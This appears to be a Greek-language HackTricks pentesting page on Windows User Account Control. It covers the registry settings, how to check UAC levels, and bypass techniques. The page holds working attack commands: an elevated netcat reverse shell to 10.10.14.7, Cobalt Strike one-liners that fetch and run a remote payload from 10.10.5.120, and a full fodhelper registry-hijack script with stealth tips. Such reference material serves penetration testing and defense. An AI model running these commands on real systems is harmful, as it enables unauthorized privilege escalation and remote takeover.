# UAC - Έλεγχος Λογαριασμού Χρήστη

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που ενεργοποιεί μια **πρόσκληση συγκατάθεσης για ενέργειες με ανυψωμένα προνόμια**. Οι εφαρμογές έχουν διαφορετικά `integrity` επίπεδα, και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελέσει εργασίες που **θα μπορούσαν ενδεχομένως να υπονομεύσουν το σύστημα**. Όταν το UAC είναι ενεργοποιημένο, οι εφαρμογές και οι εργασίες εκτελούνται πάντα **υπό το πλαίσιο ασφαλείας ενός λογαριασμού μη-διαχειριστή** εκτός εάν ένας διαχειριστής ρητά εξουσιοδοτήσει αυτές τις εφαρμογές/εργασίες να έχουν πρόσβαση επιπέδου διαχειριστή στο σύστημα για εκτέλεση. Είναι μια λειτουργία άνεσης που προστατεύει τους διαχειριστές από ακούσιες αλλαγές αλλά δεν θεωρείται όριο ασφάλειας.

Για περισσότερες πληροφορίες σχετικά με τα integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν το UAC είναι ενεργό, ένας χρήστης με δικαιώματα διαχειριστή λαμβάνει 2 tokens: ένα κλειδί τυπικού χρήστη, για την εκτέλεση κανονικών ενεργειών σε κανονικό επίπεδο, και ένα με τα προνόμια διαχειριστή.

Αυτή η [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) αναλύει λεπτομερώς πώς λειτουργεί το UAC και περιλαμβάνει τη διαδικασία σύνδεσης, την εμπειρία χρήστη και την αρχιτεκτονική του UAC. Οι διαχειριστές μπορούν να χρησιμοποιήσουν πολιτικές ασφαλείας για να ρυθμίσουν πώς λειτουργεί το UAC ειδικά για τον οργανισμό τους τοπικά (χρησιμοποιώντας secpol.msc), ή να το ρυθμίσουν και να το διανείμουν μέσω Group Policy Objects (GPO) σε περιβάλλον Active Directory domain. Οι διάφορες ρυθμίσεις περιγράφονται λεπτομερώς [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 ρυθμίσεις Group Policy που μπορούν να οριστούν για το UAC. Ο παρακάτω πίνακας παρέχει επιπλέον λεπτομέρειες:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

Ορισμένα προγράμματα είναι **autoelevated automatically** εάν ο **χρήστης ανήκει** στην **ομάδα των διαχειριστών**. Αυτά τα binaries έχουν μέσα στα _**Manifests**_ την επιλογή _**autoElevate**_ με τιμή _**True**_. Το binary πρέπει επίσης να είναι **υπογεγραμμένο από τη Microsoft**.

Πολλές διαδικασίες auto-elevate εκθέτουν **λειτουργικότητα μέσω COM objects ή RPC servers**, που μπορούν να κληθούν από διεργασίες που τρέχουν με medium integrity (προνόμια σε επίπεδο κανονικού χρήστη). Σημειώστε ότι COM (Component Object Model) και RPC (Remote Procedure Call) είναι μέθοδοι που χρησιμοποιούν τα προγράμματα Windows για να επικοινωνήσουν και να εκτελέσουν λειτουργίες μεταξύ διαφορετικών διεργασιών. Για παράδειγμα, το **`IFileOperation COM object`** έχει σχεδιαστεί για να χειρίζεται λειτουργίες αρχείων (copying, deleting, moving) και μπορεί να ανεβάσει αυτόματα προνόμια χωρίς προτροπή.

Σημειώστε ότι μπορεί να γίνουν ορισμένοι έλεγχοι, όπως ο έλεγχος αν η διαδικασία εκτελέστηκε από τον κατάλογο **System32**, κάτι που μπορεί να παρακαμφθεί για παράδειγμα με **injection into explorer.exe** ή σε άλλο εκτελέσιμο που βρίσκεται στο System32.

Ένας άλλος τρόπος να παρακαμφθούν αυτοί οι έλεγχοι είναι να **τροποποιηθεί το PEB**. Κάθε διαδικασία στα Windows έχει ένα Process Environment Block (PEB), που περιλαμβάνει σημαντικά δεδομένα για τη διαδικασία, όπως την εκτελέσιμη διαδρομή της. Τροποποιώντας το PEB, οι επιτιθέμενοι μπορούν να πλαστογραφήσουν (spoof) την τοποθεσία της δικής τους κακόβουλης διαδικασίας, κάνοντάς την να φαίνεται ότι εκτελείται από έναν αξιόπιστο κατάλογο (π.χ. system32). Αυτή η πλαστογραφημένη πληροφορία ξεγελάει το COM object ώστε να auto-elevate τα προνόμια χωρίς να εμφανιστεί προτροπή στον χρήστη.

Έπειτα, για να **παρακαμφθεί** το **UAC** (να ανυψωθεί από **medium** integrity level **σε high**), κάποιοι επιτιθέμενοι χρησιμοποιούν αυτού του είδους τα binaries για να **εκτελέσουν αυθαίρετο κώδικα** επειδή θα εκτελεστεί από μια διεργασία με **High** επίπεδο integrity.

Μπορείτε να **ελέγξετε** το _**Manifest**_ ενός binary χρησιμοποιώντας το εργαλείο _**sigcheck.exe**_ από Sysinternals. (`sigcheck.exe -m <file>`) Και μπορείτε να **δειτε** το **integrity level** των διεργασιών χρησιμοποιώντας _Process Explorer_ ή _Process Monitor_ (από Sysinternals).

### Check UAC

Για να επιβεβαιώσετε αν το UAC είναι ενεργοποιημένο κάντε:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Αν είναι **`1`**, τότε το UAC είναι **ενεργοποιημένο**, αν είναι **`0`** ή δεν υπάρχει, τότε το UAC είναι **απενεργοποιημένο**.

Έπειτα, έλεγξε **ποιο επίπεδο** έχει ρυθμιστεί:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **disabled**)  
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)  
- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)  
- If **`3`** like `1` but not necessary on Secure Desktop  
- If **`4`** like `2` but not necessary on Secure Desktop  
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Στη συνέχεια, πρέπει να κοιτάξετε την τιμή του **`LocalAccountTokenFilterPolicy`**\
Αν η τιμή είναι **`0`**, τότε μόνο ο χρήστης **RID 500** (**built-in Administrator**) μπορεί να εκτελέσει **διαχειριστικές εργασίες χωρίς UAC**, και αν είναι `1`, **όλοι οι λογαριασμοί μέσα στην ομάδα "Administrators"** μπορούν να το κάνουν.

Και, τέλος, κοιτάξτε την τιμή του κλειδιού **`FilterAdministratorToken`**\
Αν **`0`** (προεπιλογή), ο ενσωματωμένος λογαριασμός Administrator μπορεί να κάνει απομακρυσμένες διαχειριστικές εργασίες και αν **`1`** ο ενσωματωμένος λογαριασμός Administrator **δεν μπορεί** να κάνει απομακρυσμένες διαχειριστικές εργασίες, εκτός αν `LocalAccountTokenFilterPolicy` είναι ρυθμισμένο σε `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

Όλες αυτές οι πληροφορίες μπορούν να συλλεχθούν χρησιμοποιώντας το module **metasploit**: `post/windows/gather/win_privs`

Μπορείτε επίσης να ελέγξετε τις ομάδες του χρήστη σας και να βρείτε το επίπεδο ακεραιότητας:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Σημειώστε ότι αν έχετε γραφική πρόσβαση στο θύμα, το UAC bypass είναι ιδιαίτερα απλό, καθώς μπορείτε απλά να κάνετε κλικ στο "Yes" όταν εμφανιστεί το UAC prompt

The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.

It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**

### UAC απενεργοποιημένο

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Πολύ** Βασική UAC "bypass" (πλήρης πρόσβαση στο σύστημα αρχείων)

Εάν έχετε ένα shell με χρήστη που ανήκει στην ομάδα Administrators μπορείτε να **mount the C$** share μέσω SMB (σύστημα αρχείων) τοπικά ως νέο δίσκο και θα έχετε **πρόσβαση σε όλα μέσα στο σύστημα αρχείων** (ακόμη και στον φάκελο χρήστη του Administrator).

> [!WARNING]
> **Φαίνεται πως αυτό το τέχνασμα δεν λειτουργεί πια**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass με cobalt strike

Οι τεχνικές του Cobalt Strike θα λειτουργήσουν μόνο αν το UAC δεν είναι ρυθμισμένο στο μέγιστο επίπεδο ασφάλειας.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** και **Metasploit** διαθέτουν επίσης αρκετά modules για **bypass** του **UAC**.

### KRBUACBypass

Τεκμηρίωση και εργαλείο στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) το οποίο είναι μια **συλλογή** από αρκετά UAC bypass exploits. Σημειώστε ότι θα χρειαστεί να **compile UACME using visual studio or msbuild**. Η μεταγλώττιση θα δημιουργήσει αρκετά εκτελέσιμα (π.χ. `Source\Akagi\outout\x64\Debug\Akagi.exe`) , θα πρέπει να ξέρετε **ποιο χρειάζεστε.**\
Πρέπει να **προσέχετε** γιατί κάποια bypasses θα **προκαλέσουν prompts σε άλλα προγράμματα** που θα **ειδοποιήσουν** τον **χρήστη** ότι κάτι συμβαίνει.

Το UACME περιέχει την **build version από την οποία κάθε τεχνική άρχισε να λειτουργεί**. Μπορείτε να αναζητήσετε τεχνική που επηρεάζει την έκδοσή σας:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Επιπλέον, χρησιμοποιώντας τη σελίδα [this](https://en.wikipedia.org/wiki/Windows_10_version_history) μπορείτε να βρείτε την έκδοση Windows `1607` από τους αριθμούς build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Το αξιόπιστο binary `fodhelper.exe` αποκτά αυτόματα αυξημένα δικαιώματα στα σύγχρονα Windows. Όταν εκκινείται, ελέγχει το per-user registry path παρακάτω χωρίς να επικυρώνει το `DelegateExecute` verb. Η τοποθέτηση μιας εντολής εκεί επιτρέπει σε μια διαδικασία Medium Integrity (ο χρήστης ανήκει στους Administrators) να δημιουργήσει μια διαδικασία High Integrity χωρίς προτροπή UAC.

Το registry path που ερωτάει το fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Βήματα PowerShell (θέστε το payload σας, μετά trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- Λειτουργεί όταν ο τρέχων χρήστης είναι μέλος των Administrators και το επίπεδο UAC είναι default/lenient (όχι Always Notify με επιπλέον περιορισμούς).
- Χρησιμοποιήστε τη διαδρομή `sysnative` για να ξεκινήσετε ένα 64-bit PowerShell από μια 32-bit διαδικασία σε 64-bit Windows.
- Το payload μπορεί να είναι οποιαδήποτε εντολή (PowerShell, cmd, ή μια διαδρομή EXE). Αποφύγετε διεπαφές που εμφανίζουν prompts για λόγους stealth.

#### More UAC bypass

**All** οι τεχνικές που χρησιμοποιούνται εδώ για να παρακάμψουν την AUC **απαιτούν** ένα **πλήρες interactive shell** με το θύμα (ένα κοινό nc.exe shell δεν αρκεί).

Μπορείτε να το αποκτήσετε χρησιμοποιώντας μια **meterpreter** session. Κάντε migrate σε μια **process** που έχει την τιμή **Session** ίση με **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ θα πρέπει να λειτουργεί)

### UAC Bypass με GUI

Αν έχετε πρόσβαση σε GUI μπορείτε απλά να αποδεχτείτε το UAC prompt όταν εμφανιστεί — δεν χρειάζεστε πραγματικά κάποιο bypass. Επομένως, η πρόσβαση σε GUI θα σας επιτρέψει να παρακάμψετε το UAC.

Επιπλέον, αν αποκτήσετε μια GUI session που κάποιος χρησιμοποιούσε (πιθανώς μέσω RDP) υπάρχουν **κάποια εργαλεία που θα τρέχουν ως administrator** από τα οποία θα μπορούσατε να **τρέξετε** ένα **cmd** για παράδειγμα **ως admin** απευθείας χωρίς να σας ζητηθεί ξανά από το UAC, όπως [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο stealthy.

### Noisy brute-force UAC bypass

Αν δεν σας απασχολεί το να είστε θορυβώδεις, μπορείτε πάντα να τρέξετε κάτι σαν [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) που θα ζητάει ανύψωση δικαιωμάτων επανειλημμένα μέχρι ο χρήστης να το αποδεχτεί.

### Your own bypass - Basic UAC bypass methodology

Αν ρίξετε μια ματιά στο **UACME** θα παρατηρήσετε ότι οι περισσότερες UAC bypass τεχνικές εκμεταλλεύονται μια Dll Hijacking ευπάθεια (κυρίως γράφοντας το κακόβουλο dll στο _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Βρείτε ένα binary που θα **autoelevate** (ελέγξτε ότι όταν εκτελείται τρέχει σε high integrity level).
2. Με το procmon βρείτε γεγονότα "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανώς θα χρειαστεί να **γράψετε** το DLL μέσα σε κάποιες προστατευμένες διαδρομές (όπως C:\Windows\System32) όπου δεν έχετε δικαιώματα εγγραφής. Μπορείτε να παρακάμψετε αυτό χρησιμοποιώντας:
   1. **wusa.exe**: Windows 7,8 και 8.1. Επιτρέπει την εξαγωγή του περιεχομένου ενός CAB αρχείου μέσα σε προστατευμένες διαδρομές (επειδή αυτό το εργαλείο εκτελείται από high integrity level).
   2. **IFileOperation**: Windows 10.
4. Ετοιμάστε ένα **script** για να αντιγράψετε το DLL σας στη προστατευμένη διαδρομή και να εκτελέσετε το ευάλωτο και autoelevated binary.

### Another UAC bypass technique

Συνίσταται στο να παρακολουθείτε αν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **registry** το **όνομα/διαδρομή** ενός **binary** ή **εντολής** που θα **εκτελεστεί** (αυτό είναι πιο ενδιαφέρον αν το binary αναζητά αυτή την πληροφορία μέσα στο **HKCU**).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
